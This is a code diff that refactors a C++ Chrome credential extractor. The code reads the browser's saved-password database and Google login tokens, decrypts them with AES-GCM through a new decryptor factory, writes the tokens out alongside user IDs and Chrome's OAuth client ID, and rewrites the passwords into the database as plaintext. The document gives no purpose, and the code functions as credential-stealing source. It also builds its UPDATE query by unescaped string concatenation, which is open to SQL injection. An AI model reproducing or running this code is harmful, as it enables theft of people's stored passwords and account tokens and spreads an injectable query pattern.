@@ -1,14 +1,13 @@
+#include "stdafx.h"
 #include "GoogleDbExtractorBase.h"
 #include "AesGCMDecryptor.h"
 #include "openssl/evp.h"
 #include <SQLiteCpp/SQLiteCpp.h>
+#include "DataDecryptorFactory.h"
 
 namespace
 {
-    constexpr size_t s_encHeaderSize = 3;
-    constexpr size_t s_encIVOffset = s_encHeaderSize + 12;
-    constexpr size_t s_encGcmTagSize = 16;
-    const std::string s_emptyOrAccountString = "Signed with Google or empty";
+    const std::string s_emptyOrAccountString = "Signed In with Google or empty";
     const std::string s_gChromeClientId = "77185425430.apps.googleusercontent.com";
 }
 
@@ -25,21 +24,12 @@ void google::GoogleDbExtractorBase::ExtractTokens(std::map<std::string, crypt::R
         return;
     }
 
+    auto decryptor = std::unique_ptr<crypt::IDataDecrypt>(crypt::DataDecryptorFactory(dbKey)
+                                                           .createDecryptor(GetVersion()));
+
     for (auto& [login, cipherText] : tokens)
     {
-        crypt::RawVector iv(cipherText.begin() + s_encHeaderSize, cipherText.begin() + s_encIVOffset);
-        crypt::RawVector tag(cipherText.end() - s_encGcmTagSize, cipherText.end());
-        crypt::RawVector cipherTextData (cipherText.begin() + s_encIVOffset, cipherText.end() - s_encGcmTagSize);
-
-        crypt::AesGCMDecryptor decryptor;
-        if (!decryptor.setCipherType(EVP_aes_256_gcm).setIV(iv).setDecryptKey(dbKey).init())
-        {
-            spdlog::error("Can't initialize aes decrpytion!");
-            return;
-        }
-
-        cipherText.resize(cipherTextData.size());
-        decryptor.decrypt(cipherTextData, cipherText);
+        decryptor->decrypt(cipherText, cipherText);
         std::string decryptedToken(cipherText.begin(), cipherText.end());
         writer << "UserID: " << login << "\n";
         writer << "ClientID: " << s_gChromeClientId << "\n";
@@ -66,6 +56,7 @@ void google::GoogleDbExtractorBase::DecryptPasswordsDb()
 
     std::map<std::string, crypt::RawVector> passwords;
     SQLite::Database db(localPath.string(), SQLite::OPEN_READWRITE);
+
     try
     {
         SQLite::Statement query(db, "SELECT origin_url, password_value FROM logins;");
@@ -82,29 +73,24 @@ void google::GoogleDbExtractorBase::DecryptPasswordsDb()
         return;
     }
     crypt::RawVector dbKey;
+    // todo add processing for old version in which there are no pass file
     GetKey(dbKey);
+
+    auto decryptor = std::unique_ptr<crypt::IDataDecrypt>(crypt::DataDecryptorFactory(dbKey)
+                                                           .createDecryptor(GetVersion()));
 
     for (auto& [url, cipherText] : passwords)
     {
-        crypt::RawVector iv(cipherText.begin() + s_encHeaderSize, cipherText.begin() + s_encIVOffset);
-        crypt::RawVector tag(cipherText.end() - s_encGcmTagSize, cipherText.end());
-        crypt::RawVector cipherTextData(cipherText.begin() + s_encIVOffset, cipherText.end() - s_encGcmTagSize);
-
-        crypt::AesGCMDecryptor decryptor;
-        if (!decryptor.setCipherType(EVP_aes_256_gcm).setIV(iv).setDecryptKey(dbKey).init())
-        {
-            spdlog::error("Aes decrypt initialization has been failed!");
-            return;
-        }
-        cipherText.resize(cipherTextData.size());
-        decryptor.decrypt(cipherTextData, cipherText);
+        decryptor->decrypt(cipherText, cipherText);
         std::string decryptedString(cipherText.begin(), cipherText.end());
+
         if (decryptedString.empty())
         {
             decryptedString.assign(s_emptyOrAccountString);
         }
 
-        const std::string updateQuery = "UPDATE logins SET `password_value` = \"" + decryptedString + "\" WHERE `origin_url`= \"" + url + "\"";
+        const std::string updateQuery = "UPDATE logins SET `password_value` = \"" +
+                                        decryptedString + "\" WHERE `origin_url`= \"" + url + "\"";
         try
         {
             db.exec(updateQuery);
